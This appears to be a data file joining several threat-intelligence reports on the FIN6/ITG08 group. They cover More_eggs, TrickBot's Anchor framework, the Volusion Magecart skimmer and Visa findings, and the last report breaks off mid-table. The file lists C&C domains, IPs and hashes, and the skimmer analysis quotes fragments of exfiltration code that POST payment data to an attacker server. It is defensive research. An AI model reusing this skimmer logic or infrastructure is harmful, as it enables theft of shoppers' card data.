“D Bacte Ltd.” ITG08 Attacks Organizations for Financial Gain ITG08 has been around for over four years now. Its attacks are ﬁnancially motivated, sophisticated and persistent. The group historically has specialized in stealing payment card data from POS machines and has more recently expanded operations to target card- not-present data from online transactions. To follow information about ITG08 as it emerges, please join us on X-Force Exchange. Mitigation Tips Effective network defense and threat intelligence rely on multiple factors, such as knowing the network’s attack surface, understanding the threat actor’s motivations and TTPs, and the skill and knowledge of the security team that enable it to identify malicious behavior. IBM X-Force IRIS has gained insight into ITG08’s intrusion methods, ability to navigate laterally, use of custom and open-source tools, and typical persistence mechanisms. Our team has provided the following mitigation tips for defenders who are looking out for attacks by this https://securityintelligence.com/posts/more_eggs-anyone-threat-actor-itg08-strikes-again/ Pagina 16 di 24 More_eggs, Anyone? Threat Actor ITG08 Strikes Again 18/06/24, 17:21 group. Educate Users About Email X-Force IRIS determined that the ITG08 compromise was the result of a phishing email in which the initial compromise was made possible by a victim who clicked on a malicious attachment. Role-based security awareness training should be at the top of the list of any organization’s mitigation strategies to help employees recognize phishing emails and possible malicious attachments, and to educate them about their security responsibilities with regards to reporting potentially malicious emails. Search for Known IoCs After the phishing email resulted in a successful inﬁltration, ITG08 used the More_eggs backdoor to gain a foothold and infect additional devices. More_eggs-related artifacts such as the DLL dropper have extremely low antivirus (AV) detection rates, based on analysis conducted via VirusTotal (VT). For example, a More_eggs DLL dropper submitted to VT on April 18, 2019 had a detection rate of only 5 percent. To detect this malware, critical events should be analyzed based on the attacker’s patterns. SYSMON or an endpoint detection and response tool should be conﬁgured to detect the combined use of msxsl.exe and WMI. In addition, Registry keys and scheduled tasks should be analyzed for indications of persistence. The network should also be scrutinized for any privilege escalation events and any signs of internal reconnaissance. YARA signatures should also be created to assist security personnel in detecting the More_eggs malware. YARA signatures for X-Force IRIS premium subscribers can be provided on request. Analyze Logs Other mitigation strategies against this type of activity include analyzing host-based ﬁrewall logs for internal pivoting, unauthorized listening executables and scanning activity. In addition, conﬁguring PowerShell https://securityintelligence.com/posts/more_eggs-anyone-threat-actor-itg08-strikes-again/ Pagina 17 di 24 More_eggs, Anyone? Threat Actor ITG08 Strikes Again 18/06/24, 17:21 script logging and identifying any obfuscation will assist in mitigating ITG08’s use of PowerShell to conduct malicious activity. ITG08 has also demonstrated the use of stolen credentials; therefore, multiple failed login attempts and/or unauthorized account usage may be indicators of ITG08 activity on a network. Monitor for Remote Services X-Force IRIS also recommends taking steps to prevent lateral movement. Although lateral movement can be difﬁcult to detect, a spike in usage of Windows tools, such as remote administration services (PowerShell Remoting and WMI), should be monitored. Detection and monitoring capabilities should be in place and network defenders should be familiar with what is considered a “normal” baseline on their user network. Without a baseline of “normal” activity, the use of Windows tools may blend in with legitimate activity, which can allow attackers to continue to live off the land unnoticed. Rethink Network Architecture Security defenders should examine network architecture to see how the network is segregated, what Windows tools are restricted or used by administrators, and what alerts are set up to warrant personnel review. Least privilege principals should be implemented for all users on the network, and a strong password management system with two-factor authentication and password expiration dates should be deployed as an additional layer of security. Pen Test! Organizations looking to limit the ways by which attackers can inﬁltrate their networks should be mindful of ongoing patching of vulnerabilities. After reaching maturity on the vulnerability assessment front, mitigation strategies should also include penetration testing to ﬁnd unknown vulnerabilities related to people, software and hardware used on the organization’s critical assets and externally facing resources. https://securityintelligence.com/posts/more_eggs-anyone-threat-actor-itg08-strikes-again/ Pagina 18 di 24 More_eggs, Anyone? Threat Actor ITG08 Strikes Again 18/06/24, 17:21 Incident Response Nowadays, no organization can be exempt from planning and drilling incident response plans in the face of potential security incidents. Conducting tabletop exercises and regularly drilling plans can help organizations proactively prepare and take control of an incident if ever one should occur. For additional resources and information, please check out X-Force IRIS. If you believe your organization may be under attack, please call the X- Force Emergency Response Hotline at 888-241-9812. Appendix A: IoCs More_eggs C&C domains: api[.]cloudservers[.]kz mail[.]rediffmail[.]kz secure[.]cloudserv[.]ink metric[.]onlinefonts[.]kz news[.]bradpitt[.]kz Landing page domains (downloads ﬁles): usastafﬁng[.]services usstafﬁng[.]services jobhyper[.]com Meterpreter C&C IP addresses: 185[.]162[.]128[.]70*. 185[.]243[.]115[.]50 192[.]99[.]20[.]90 192[.]187[.]103[.]42 37[.]1[.]221[.]212. *Also the C&C IP address for the Metasploit Shellcode Loader. ReverseShell executable (DLL) C&C IP address: https://securityintelligence.com/posts/more_eggs-anyone-threat-actor-itg08-strikes-again/ Pagina 19 di 24"
fin6,cti-hal,4c4131df654d,G0037," Go to listing page FIN6 group goes from compromising PoS systems to deploying ransomware Threat Actors April 09, 2019 Cyware Hacker News      The group was observed to deploy ransomware such as Ryuk and LockerGoga on compromised networks that did not contain any payment data. Just like its PoS exploits, FIN6 relied on Windows’ Remote Desktop Protocol (RDP) to move laterally across a ected networks. FIN6, which is one of the sophisticated cybercriminal groups, has now moved to deploy ransomware in its attacks. This recent development was uncovered by security  rm FireEye when it analyzed a cyber attack performed on an engineering industry. It was found that FIN6 installed ransomware on systems that did not have any payment data on them. The big picture In the attack analyzed by FireEye, FIN6 employed two di erent techniques after using Windows’ RDP to laterally move across the networks. This movement enabled FIN6 to then inject LockerGoga and Ryuk ransomware. The  rst technique involved executing an encoded command through PowerShell. The command downloaded a Cobalt Strike payload, which in turn was con gured to drop a malicious payload onto the systems. This payload remains unknown as of now. The second technique involved the use of a Windows Service created by Metasploit, that was used to communicate with a C2 server for dropping additional payloads into compromised systems. This would allow FIN6 to escalate privileges in the system. Worth noting FireEye suggested that the group’s shift to ransomware might be the next method in its extortion related operations. “As the frequency of these intrusions deploying ransomware has increased, the cadence of activity traditionally attributed to FIN6—intrusions targeting point-of-sale (POS) environments, deploying TRINITY malware and sharing other key characteristics—has declined. Given that, FIN6 may have evolved as a whole to focus on these extortive intrusions,” the researchers stated in their blog. As always, advanced cybercriminal groups like FIN6 are continuously evolving to evade security measures and subvert large-scale networks for monetary purposes. Lateral Movement Techniques LockerGoga Trinity FireEye Ryuk ransomware Publisher Cyware  PREVIOUS Zero-day  aw leaves TP- Link routers open to remote att ... Malware and Vulnerabilities  NEXT Anubis Android trojan spotted stealing PayPal credentia ... Malware and Vulnerabilities CATEGORIESExpert Blogs andOpinionTrends, Reports,AnalysisCyber GlossarySocial Media ThreatsRESOURCESCyber FusionCenter GuideEVENTSConference"
fin6,cti-hal,0146cfc5357e,G0037,"ITG08 (aka FIN6) Partners With TrickBot Gang, Uses Anchor Framework 20/06/24, 11:51 ITG08 (aka FIN6) Partners With TrickBot Gang, Uses Anchor Framework A U 1 ! Light Dark April 7, 2020 By Ole Villadsen 6 min read Advanced Threats https://securityintelligence.com/posts/itg08-aka-fin6-partners-with-trickbot-gang-uses-anchor-framework/ Pagina 1 di 12 ITG08 (aka FIN6) Partners With TrickBot Gang, Uses Anchor Framework 20/06/24, 11:51 The past two years have borne witness to the increasing collaboration between organized cybercrime groups to avoid duplication of efforts and maximize proﬁts. Although this collaboration has primarily occurred between gangs developing and distributing well-known banking Trojans, Threat Intelligence such as Emotet, TrickBot and IcedID, it does not stop there. In a new and dangerous twist to this trend, IBM X-Force Incident Response and Intelligence Services (IRIS) research believes that the elite cybercriminal threat actor ITG08, also known as FIN6, has partnered with the malware gang behind one of the most active Trojans — TrickBot — to use TrickBot’s new malware framework dubbed “Anchor” against organizations for ﬁnancial proﬁt. The Anchor malware framework itself is not new and its origins date back to at least 2018. It appears to be tightly connected to TrickBot and is likely programmed by the same malware authors that work on TrickBot. Cybersecurity ﬁrms SentinelOne and Cybereason have published reports in recent months describing Anchor as new malware developed by the TrickBot gang for use in targeted attacks against enterprises, including a new PowerShell-based backdoor called PowerTrick. ITG08 and TrickBot — A Loaded Duo ITG08/FIN6 is an organized cybercrime gang that has been active since 2015, primarily targeting point-of-sale (POS) machines in brick-and- mortar retailers and companies in the hospitality sector across the U.S. and Europe. TrickBot is a banking Trojan that emerged in 2016 and has since grown to be one of the top, and most sophisticated, Trojans being used by organized cybercrime gangs believed to be hailing out of Russia. In the past six months, the Anchor backdoor malware, which includes a variant that communicates over DNS (Anchor_DNS), has been used in targeted attacks on enterprise networks — including POS systems — following initial infection by the TrickBot Trojan. The way organizations are being attacked ties with typical ITG08 activity reported throughout the past few years. https://securityintelligence.com/posts/itg08-aka-fin6-partners-with-trickbot-gang-uses-anchor-framework/ Pagina 2 di 12 ITG08 (aka FIN6) Partners With TrickBot Gang, Uses Anchor Framework 20/06/24, 11:51 Through connecting our own ﬁndings with information from other security research reports, X-Force IRIS has determined that the threat actor ITG08 has partnered with the TrickBot gang to use that group’s PowerTrick and Anchor backdoor malware for attacks on high-proﬁle targets. This post provides more detail on that connection. Tying ITG08 (FIN6) With Use of TrickBot’s Anchor Framework A past analysis by X-Force IRIS gave extensive information about ITG08’s use of a backdoor known as “More_eggs”. The gang’s relationship with the boutique underground provider selling the TerraLoader loader and More_eggs backdoor leads to direct evidence of its use of PowerTrick and Anchor. Bringing this cybercrime seller back into the picture, SentinelOne researchers reported observing a threat actor using PowerTrick and Anchor to download two samples developed and sold by the same seller: a TerraLoader that installs the More_eggs backdoor and a TerraLoader that deploys a signed Metasploit shellcode loader. The evidence provided below links these two samples to ITG08. More_eggs Sample Analysis X-Force IRIS is almost certain the TerraLoader and More_eggs samples were purchased by ITG08 based on similarities with two other More_eggs samples. We encountered the ﬁrst sample in 2019 during an investigation of attacks we attributed to ITG08. We found the second sample, a Terraloader dropping a More_eggs backdoor, in a public repository that also showed ties to the ITG08 group. TerraLoader Downloaded by PowerTrick ITG08 use in early 2019 (X- Found in VirusTotal / (SentinelOne) Force IRIS) More_eggs sample C2 Domain drive.staticcontent[.]kz metric.onlinefonts[.]kz host.moresecurity[.]kz https://securityintelligence.com/posts/itg08-aka-fin6-partners-with-trickbot-gang-uses-anchor-framework/ Pagina 3 di 12 ITG08 (aka FIN6) Partners With TrickBot Gang, Uses Anchor Framework 20/06/24, 11:51 Domain 2/28/2019 2/28/2019 2/28/2019 registration date Domain registration email Click and scroll to view AllfordJoshua49@yandex.com AllfordJoshua49@yandex.com full table AllfordJoshua49@yandex.com More_eggs ZkY3egXBulkogSbGEHqdA ZkY3egXBulkogSbGEHqdA wearenotcobaltthanks RKey TerraLoader 3/18/2019 n/a 3/4/2019 compile date Table 1: Comparison of three More_eggs samples and their command- and-control (C&C) domains All three C&C domains were created at the same time using the same email registration address. Two of the samples — the one downloaded by Anchor and the one attributed to ITG08 — use the same RKey, which is used in part to encrypt communications with the C&C host. Two of the TerraLoaders were compiled within two weeks of each other. The remaining TerraLoader could not be recovered. The RKey in the ﬁnal sample, “wearenotcobaltthanks,” is a reference to the Cobalt Gang group, which previously had used the More_eggs backdoor. X-Force IRIS has found a similar message in other More_eggs samples attributed to ITG08: a variable called “Researchers” with the content, “We are not cobalt gang, stop associating us with such skids!” Metasploit Shellcode Loader Sample Analysis SentinelOne previously observed Anchor downloading a signed TerraLoader. That ﬁrst step was followed by installing an Apache Bench executable hollowed out with a Metasploit loader shellcode that https://securityintelligence.com/posts/itg08-aka-fin6-partners-with-trickbot-gang-uses-anchor-framework/ Pagina 4 di 12 ITG08 (aka FIN6) Partners With TrickBot Gang, Uses Anchor Framework 20/06/24, 11:51 received an RC4 encrypted payload. X-Force IRIS lacks the sample hash or code-signing certiﬁcate to attribute this malware deﬁnitively to ITG08, but it is very similar to other samples we did attribute to the ITG08 group. In 2019, X-Force IRIS observed ITG08 employ a signed Metasploit shellcode loader masquerading as the Apache Bench application and containing a Comodo code-signing certiﬁcate issued to “MAHTEM LTD.” The shellcode was loaded into memory and designed to receive an RC4- encrypted buffer. This sample was used during an intrusion that featured the use of More_eggs. X-Force IRIS identiﬁed a signed TerraLoader in a public repository that also decrypts a shellcode loader masquerading as Apache Bench. The sample used a code-signing certiﬁcate issued to “D. Bacte Ltd.”, which we found in other samples that we attributed to ITG08 in some of our previous investigations. More Evidence of ITG08’s (FIN6) Fingerprints on TrickBot Malware Further clues connect ITG08 to TrickBot and its operators’ other malware. Generally speaking, the tactics used to deploy More_eggs in victim environments, as well as other threat actor tactics, techniques and procedures (TTPs) used during these Anchor campaigns, are unusually consistent with those used by ITG08. More_eggs & TerraLoader Deployment According to SentinelOne, the threat actor used PowerShell to download and execute a TerraLoader that installed More_eggs. X-Force IRIS has observed ITG08 employ the same tactic whereby it used PowerShell and Windows Management Instrumentation (WMI) to download and execute TerraLoader, then install More_eggs on remote hosts. X-Force IRIS has not observed any other actors who use More_eggs employ this tactic. Those who do typically install More_eggs only during the initial infection, after which they download additional malware or tools to proceed with https://securityintelligence.com/posts/itg08-aka-fin6-partners-with-trickbot-gang-uses-anchor-framework/ Pagina 5 di 12 ITG08 (aka FIN6) Partners With TrickBot Gang, Uses Anchor Framework 20/06/24, 11:51 their intrusion phase. TTPs Consistent With ITG08 In a blog about the subject, researchers from Cybereason noted that many of the threat actor TTPs they observed while using the Anchor framework were consistent with FIN6 activity, including the targeting of POS systems and the use of tools such as Metasploit, Cobalt Strike and AdFind. X-Force IRIS has also encountered these TTPs in attacks that we attributed to ITG08. While these TTPs alone are insufﬁcient to attribute the activity to ITG08, they are nevertheless fully consistent with ITG08 activity. On a ﬁnal note, X-Force IRIS is unaware of other threat actors deploying the combination of TerraLoader, More_eggs and Metasploit shellcode loaders in the manner described above. This activity, combined with the additional TTPs attributed to ITG08, such as the use of Metasploit, Cobalt Strike and AdFind while targeting POS systems, leads us to conclude with conﬁdence that ITG08 is one of the threat actors using TrickBot’s PowerTrick and the Anchor malware framework. ITG08 Connecting to Evolve ITG08’s partnership with the TrickBot gang to use its Anchor malware framework is the latest example of a cybercriminal group that has repeatedly demonstrated its ability to adopt new malware and adapt to changing circumstances that threaten the group’s ability to obtain illicit proceeds. In this respect, ITG08 behaves much like a commercial enterprise: adopting new technology, building strategic partnerships and grappling with changing markets by moving into new “lines of business” while leveraging their core strengths and outsourcing those of other groups. ITG08’s partnership with the TrickBot gang not only provides the group with new malware and potential access to enterprises infected with the TrickBot Trojan; it also reveals additional evidence of the group’s strategy https://securityintelligence.com/posts/itg08-aka-fin6-partners-with-trickbot-gang-uses-anchor-framework/ Pagina 6 di 12 ITG08 (aka FIN6) Partners With TrickBot Gang, Uses Anchor Framework 20/06/24, 11:51 to partner with other threat actors and malware developers. These varied relationships with elite cybercriminal actors and those who sell them tools, access and software allow ITG08 to continue to rely on its strengths in post-exploitation tactics, such as lateral movement, privilege escalation and data exﬁltration, and outsource other attack vectors as needed. The partnership with TrickBot is not the only evolution for ITG08. In recent years, this group has evolved to employ additional means to obtain illicit proceeds, including the targeting of e-commerce environments by injecting malicious code into online checkout pages of compromised websites in a modus operandi known as “Magecart.” ITG08 also maintains established relationships with underground malware suppliers, such as the one responsible for developing and selling the TerraLoader loader and More_eggs JScript backdoor. ITG08 continues to beneﬁt from its relationship with the developer behind More_eggs, whose malware features very low antivirus detection rates and makes use of other methods to evade detection, such as bypassing application whitelisting. ITG08 has also been targeting e-commerce environments with a technique known as online skimming or grouped under what’s known as Magecart activity. In fact, ITG08 is the same group as Magecart Group 6. This relatively new activity almost certainly is a response to the adoption of EMV chips and point-to-point encryption. ITG08 may also be part of attacks that deploy ransomware, such as Ryuk, LockerGoga and MegaCortex, again in likely partnership with banking Trojan botnets, which could be a further attempt to move into new “markets” that do not rely on the need to monetize credit card data. Financially motivated, adaptable, sophisticated and persistent, ITG08 is likely to remain one of the most potent cybercriminal groups in this new decade. Listen to a podcast episode on the impact of the ITG08 threat group https://securityintelligence.com/posts/itg08-aka-fin6-partners-with-trickbot-gang-uses-anchor-framework/ Pagina 7 di 12 ITG08 (aka FIN6) Partners With TrickBot Gang, Uses Anchor Framework 20/06/24, 11:51 Indicators of Compromise (IoCs) More_eggs C&C: hxxps://drive.staticcontent[.]kz/drive/info hxxps://metric.onlinefonts[.]kz/metric/inf hxxps://host.moresecurity[.]kz/host/info Metasploit Shellcode Loaders: d9a245f1fb502606c226c364aa1090f25916e68f5ff24ef75be87ad6a2e6dcc9 d39f8aa90d54fd010484d7bb54c18549c3f03b02385020a35589dbe49e979bab TerraLoaders dropping More_eggs: dcf714bfc35071af9fa04c4329c94e385472388f9715f2da7496b415f1a5aa03 49af65995e51d88bbe8b0d4be5a5df2692aa57800f1875a18ecbd3f483c8a094 Banking Trojan | Collaboration | Command-and-Control (C&C) | Cybercrime | Cybercriminals | E-commerce | Finanacial Malware | Malware Analysis | Organized Crime | Point-of-Sale (POS) Systems | POS Malware | Ransomware | TrickBot | Trojan | X-Force Ole Villadsen Cyber Threat Hunt Analyst, IBM Security POPULAR https://securityintelligence.com/posts/itg08-aka-fin6-partners-with-trickbot-gang-uses-anchor-framework/ Pagina 8 di 12 ARTIFICIAL INTELLIGENCE | June 7, 2024 Open source, open risks: The growing"
fin6,cti-hal,4c64c625e025,G0037,"Business  Cyber Crime Magecart Card Skimmers Injected Into Online Shops We discovered that the online credit card skimming attack known as Magecart or E-Skimming was actively operating on 3,126 online shops. By: Joseph C Chen October 10, 2019 Read time: 6 min (1565 words)  Authors Joseph C Chen Threat Researcher Updated on October 14, 2019 at 2:50 AM PST to add a statement from Volusion. We discovered that the online credit card skimming attack known as Magecart or E-Skimming was actively operating on 3,126 online shops. Our data shows that the attack started on September 7, 2019. All of the impacted online shops are hosted on the cloud platform of the e- commerce service provider “Volusion,” one of the top e-commerce platforms in the market. This is actually the third time we have identiﬁed a card skimmer injected into the cloud platform of an e-commerce provider. Two other businesses were already victimized this year: a campus e- CONTACT US commerce platform and a hotel e-commerce platform. These targets are obviously appealing to cybercriminals since they are connected to multiple — in this most recent case, thousands of — online shops. We found malicious code injected into a JavaScript library provided by Volusion to their client shops. The injected code loaded another JavaScript stored on a Google Storage service. The loaded script is almost a direct copy of a normal JavaScript library but has a credit card skimmer carefully integrated. When customers submit their payment information, the skimmer will copy and send the personal information and credit card details to an exﬁltration server belonging to the attackers. Our team contacted Google and they have removed the ﬁle. The attack is currently o!ine. As of publication, Volusion has acknowledged and ﬁxed the issue. Figure 1. Online credit card skimming attack chain Figure 2. Country distribution of online shop users who accessed the card skimmer (based on data from the Trend Micro™ Smart Protection Network™ infrastructure) During our investigation, we found that the attackers seemed more experienced and thoughtful than many other skimmer groups. They did not simply add their malicious code at the top or end of a script; instead, they carefully integrated the code into the original script to be part of the execution ﬂow of the program. The code was also written as simply as possible, making it di""cult to be identiﬁed in a big library. Furthermore, they registered the domain of their exﬁltration server in a similar style to a legitimate Volusion domain. Considering the modus operandi, we believe the attackers are from Magecart Group 6, which has also been identiﬁed as the notorious threat actor FIN6. We found similarities in the code used in this attack and the code used in FIN6’s previous attacks on British Airways and Newegg. Analysis of the code injection The attackers injected their code into a library provided on Volusion’s e-commerce platform for their client shops. The script, described by the comments on the library, includes the necessary code for the pop-out feature of the shop’s navigation menu. It was also used on the shop checkout page. The script is located at:  hxxps://[online shop domain]/a/j/vnav.js The attackers didn’t just inject their code inside the library. They also integrated their code into the original function of jQueryUI code to be executed with the original execution ﬂow. They created a new object “e.widget.unbridge” right before the original object “e.widget.bridge” and the malicious code is inside the new object. It’s worth noting that the attackers even wrote their malicious code in a similar coding style to make it look more like a part of the original source code. The injected object will create a new script element to load another remote script stored on Google Storage. Figure 3. Malicious script injected into Volusion’s JavaScript library Figure 4. Comparison of the original Volusion script (left) and the script with injection (right); the injected malicious code is highlighted Analysis of the credit card skimmer The loaded remote script is on Google Storage:  hxxps[:]//storage[.]googleapis[.]com/volusionapi/resources.js Much of the code inside the script is from the library “js-cookie” version 2.2.1. However, the attackers modiﬁed it and integrated a credit card skimmer into the original script. The skimmer binds at the events “mousedown” and “touchstart” of the payment submit button. This means that when victims click (from desktop) or touch (from mobile devices) the submit button, the events will be triggered and the skimmer will be executed. Figure 5. Comparison of the JavaScript library injected with the skimmer (left) and the original “js- cookie” library (right) The skimmer copies the information on the entire payment form: the victim’s name, address, phone number, email address, and credit card details (the number, cardholder name, expiration month, expiration year, and CVV number). Once the skimmer has the credit card details, it serializes the copied data into a string and encodes it with Base64. Then, it performs a character permutation on the encoded string to make sure it can’t be directly decoded with Base64 decoding. The data will then be stored in sessionStorage with the key “__utmz_opt_in_out”. The next time the skimmer is loaded (usually on the page after the payment), it will detect if there is data inside sessionStorage and it will use HTTP POST to send the stolen payment information to a remote server at “hxxps[:]//volusion-cdn[.]com/analytics/beacon” for exﬁltration. Figure 6. Main script of the credit card skimmer Note that the attackers used the domain “volusion-cdn[.]com” for their exﬁltration server, a similar name to Volusion’s legitimate server. A possible reason why the attackers stored the skimmer on Google Storage is because Volusion is also running its service on the Google Cloud Platform. Evidence of Magecart or FIN6 As previously mentioned, based on the modus operandi, we believe the attackers are from Magecart Group 6, also known as the threat actor FIN6. Here are the connections we considered:    Group 6 is known to only target top-tier victims, investing in scams where they can receive a big payo! from one attack. This single hack of Volusion allows them to receive credit card data from 3,126 online shops. From the previous skimming attack on the British Airways and Newegg websites, we know that Group 6 tried to register the domains of the exﬁltration server to be similar to the victims’ domains. In this case, the domain of the exﬁltration server is “volusion-cdn[.]com” — very similar to the valid domain “cdn3[.]volusion[.]com” from Volusion. In addition, the exﬁltration domains used during the British Airways, Newegg, and Volusion attacks are all registered through Namecheap. We found that the skimmer is an improved version of the previous skimmer used in the attacks on British Airways and Newegg. Both old and current skimmers are written with jQuery, serialize the stolen data, and use the jQuery.ajax function to POST data to a remote server. Although the older skimmer is much simpler compared to the current one, it didn’t encode the stolen data or store the data in sessionStorage before the exﬁltration. Target Script of data exﬁltration request British Airways jQuery.ajax({type:""POST"",async:0,url:”[exﬁltration url]”,data:t,dataType:""application/json}) Newegg Volusion jQuery.ajax({type:""POST"",async:true,url:”[exﬁltration url]”,data:pdati,dataType:""application/json}) $.ajax({type: 'POST',url: '[exﬁltration url]',dataType: 'application/x-www-form- urlencoded',data: d,complete: function() { window.sessionStorage.removeItem('__utmz_opt_in_out'); }}) It’s also interesting to see that the skimmer in this attack binds to event “mousedown” and event “touchstart” of the payment submit button. The previous Group 6 skimmer binds to event “mouseup” and event “touchend”. These events are di$erent, but they are the pairs of each other that trigger the skimmer at almost the same time. It seems that they want to trigger the skimmer at the same moment, but the current version binds on two opposite events of the pairs to avoid detection from heuristic rules. Target Script of event binding British Airways .bind(""mouseup touchend"", function(a) {…}) Newegg .bind(""mouseup touchend"", function(e) {…}) Volusion .bind('mousedown touchstart', z) It seems that Magecart is continuing to change and experiment with new attack methods, reﬁning its skimmer to evade detection. Sophisticated groups such as these will always try to ﬁnd new ways to stay undetected in their victims’ systems. To defend against this type of threat, website owners should regularly check and strengthen their security with patches and server segregation. Site owners should also employ robust authentication mechanisms, especially for those that store and manage sensitive data. IT and security teams should restrict or disable outdated components and habitually monitor websites and applications for any indicators of suspicious activity that could lead to data exﬁltration, execution of unknown scripts, or unauthorized access and modiﬁcation. The following Trend Micro solutions, powered by XGen™ security, protect users and businesses by blocking the scripts and preventing access to the malicious domains:  Trend Micro Security  Smart Protection Suites and Worry-Free™ Business Security  Trend Micro Network Defense  Hybrid Cloud Security Researcher Marcel Afrahim also published a Medium post on this case. Indicators of Compromise Indicator Attribution Detection name volusion-cdn[.]com https[:]//volusion-cdn[.]com/analytics/beacon https[:]//storage[.]googleapis[.]com/volusionapi/resources.js 2348433df49e73217969a45726c53441f092c4a6fce57d1d58a6cf79d3976058 cee25c699a14a04c6e1b6e6fcd5ce7d4414c9f324b62509a7af14ae5bf749af8 d03f18a71ce059a79840a38aad4944426f0524bbd68a7a8fb7003c82996e6533 FIN6 exﬁltration server domain FIN6 exﬁltration server URL FIN6 credit card skimmer URL FIN6 credit card skimmer hash FIN6 credit card skimmer hash FIN6 credit card skimmer hash TrojanSpy.JS.MAGECART.C TrojanSpy.JS.MAGECART.D TrojanSpy.JS.MAGECART.D A Volusion spokesperson has added the following statement: ""Volusion was alerted of a data security incident and can conﬁrm that it was resolved within a few hours of notiﬁcation. We are coordinating with authorities on this matter, and continue to enhance our systems that detect and prevent unauthorized access to user accounts. A limited portion of customer information was compromised from a subset of our merchants. This included credit card information, but not other associated personally identifying details. We are not aware of any fraudulent activity connected to this matter. Volusion has taken action to help secure accounts, and we are continuing to monitor this matter in order to assure the security of our merchants."" Tags Endpoints | Cyber Crime | Research United States  Experience our uniﬁed platform for free C l a i mC l a i mC l a i mC l a i m y o u r 3 0 - y o u r 3 0 - y o u r 3 0 - y o u r 3 0 - d a y t r i a l d a y t r i a l d a y t r i a l d a y t r i a l Cliccando su “Accetta tutti i cookie”, l'utente accetta di memorizzare i cookie sul dispositivo per migliorare la navigazione del sito, analizzare l'utilizzo del sito e assistere nelle nostre attività di marketing. Impostazioni cookie Accetta tutti i cookie ResourcesSupportAboutTrendCountryHeadquartersSelect a country / regionPrivacyPrivacyPrivacyPrivacyLegalLegalLegalLegalAccessibilityAccessibilityAccessibilityAccessibilityTermsTermsTermsTermsof Useof Useof Useof UseSitemapSitemapSitemapSitemapCopyright ©2024 TrendMicro Incorporated. Allrights reserved."
fin6,cti-hal,c6eb950b4c21,G0037,"Visa Public Visa Payment Fraud Disruption - Situational Intelligence Report February 2019 FIN6 Cybercrime Group Expands Threat to eCommerce Merchants Summary FIN6 is a financially motivated threat actor group in operation since at least 2015. The group has compromised multiple point-of-sale (POS) environments using the TRINITY POS (aka FrameworkPOS) malware. In September 2017, forensic investigations of several undisclosed entities revealed evidence that FIN6 actors changed to target card-not-present (CNP) data when they could not deploy their malware in the POS environment. Evidence shows that FIN6 injected malicious code into the merchants’ eCommerce environment, placing skimming malware on the victims’ checkout pages. Based on Visa Payment Fraud Disruption’s (PFD) analysis of eCommerce compromises throughout 2018, FIN6’s focus on the CNP environment has only amplified, suggesting that the cybercrime group has fully incorporated targeting CNP environments into their criminal methodology. The majority of eCommerce compromises reported in 2018 involved direct targeting of vulnerabilities within the eCommerce website itself. As one of the more sophisticated groups targeting eCommerce merchants, FIN6 brings their POS compromise approach to the emerging threat landscape of CNP breaches. FIN6 targets companies, using phishing emails in an attempt to infect the targeted victim’s network. The actors then move through the network to identify POS and eCommerce environments. PFD assesses that the increased focus of a sophisticated cybercrime group, such as FIN6, on eCommerce environments is a broader representation of the overall cybercriminal focus on the CNP space. Recent Activities At the end of 2018, Visa Payment Intelligence analysts discovered that FIN6 actors targeted multiple high value eCommerce merchants with malicious documents that contained links to a malicious server that allowed the execution of PowerShell scripts, granting the attackers direct access to the merchants’ networks. The PowerShell scripts were only present in memory, and did not download additional files to the user’s machine, making it difficult for the victim to detect. The FIN6 actors were able to utilize this access to move through the merchant’s networks to access the eCommerce environment, and specifically the payment servers. A full investigation of these compromises show that the FIN6 actors specifically targeted the eCommerce networks and did not exploit them opportunistically. PFD-18-024 Visa Public February 2019 Visa Public Visa Payment Fraud Disruption Figure 1 - FIN6 eCommerce Attack Flow Tactics, Techniques, and Procedures (TTPs) Initial Compromise FIN6 employs a multitude of tactics within the initial phase of their operations. In the most recent compromises attributed to FIN6, forensic investigators identified the use of malicious documents to infect victims with malware known as More_Eggs (aka Terra Loader) that is used to launch malicious scripts on the infected machine. Maintain Access FIN6 establishes a foothold within a victim’s environment by leveraging various payloads, such as components of the Metasploit Framework (e.g., Meterpreter, JSPSPY and CmdSQL), or through a PFD-18-024 Visa Public February 2019 Visa Public Visa Payment Fraud Disruption specialized version of the AMMYY remote administration tool (RAT) known as FlawedAmmyy. In the most recent cases, attackers then establish persistent access to the victim’s network using Meterpreter related code, allowing the attackers to maintain a remote connection to the infected system. Internal Reconnaissance FIN6 uses legitimate publicly available tools to map the internal network and conduct reconnaissance. During the reconnaissance phase, the actors gather information on systems running SQL Database Server instances and dump schemas for multiple databases and SQL user accounts. The actors also target network credentials using a malware family known as Stealer One (see below in the section Technical Analysis and Indicators of Compromise). Additionally, FIN6 employs legitimate administrative tools, such as: • Microsoft's built-in SQL querying tool (osql.exe) • Query Express (a free, portable graphical SQL client) • AdFind (a free command-line tool for querying Active Directory) • ProcDump (a Microsoft SysInternals command-line utility used to perform analysis of running processes). Escalate Privileges Once FIN6’s accesses are established with preferred backdoors, they use additional public utilities, such as Windows Credentials Editor and Metasploit-related tools, for privilege escalation and credential harvesting. Move Laterally/Maintain Presence Capitalizing on data acquired via internal reconnaissance, FIN6 relies on credentials stolen from various systems (e.g. usernames and password hashes) for lateral movement. Investigations show that FIN6 relies on PowerShell scripts and Meterpreter based shells to maintain access to and move laterally through the network (see below in the section Technical Analysis and Indicators of Compromise). PFD-18-024 Visa Public February 2019 Visa Public Visa Payment Fraud Disruption Technical Analysis and Indicators of Compromise (IOCs) Malicious Files – Stealer One Stealer One is a credential stealer, first observed by industry forensic investigators in March 2017. The malware targets a variety of applications, including email clients, web browsers, FTP clients, and other file transfer utilities. Observed File Name: 46602.txt SHA256: 4b914bc94c453d88ee82545ff6184491e8b100b6d9a3d0316a2b656187e4fb6a DNS Request(s): static.akamaitechnologies[.]kz (185.180.198[.]110) HTTP Request(s): hxxps://static.akamaitechnologies[.]kz/sonemone/version.php Notes: Stealer One (aka SONE or InfoStealer) Malware Observed File Name: 8632.txt SHA256: 59cbd46db5f28536872bf7f7dd86da0a5ef1e147ff2418c37fc037ab9ed5e34c Authenticode Signature Block Signature verification: Signed file, verified signature Signing date: 03/05/2018 Signers: 223647473 (MJO TM LTD) Certificate SHA-1 Thumbprint: E1E086A9B6C1614470A94A515AEA1D372E1640A9 Certificate Serial Number: 56 E1 98 80 2B 37 C7 09 54 81 67 2B 7B 58 21 F4 DNS Request(s): static.akamaitechnologies[.]kz (185.180.198[.]110) HTTP Request(s): hxxps://static.akamaitechnologies[.]kz/sonemone/version.php Notes: Stealer One (aka SONE or InfoStealer) Malware VirusTotal Intelligence (VTI) Visa discovered seven other files on VirusTotal which are signed with the same ""223647473 (MJO TM LTD)"" certificate, suggesting these files are controlled by the same cybercrime group. MD5 Hash File Description 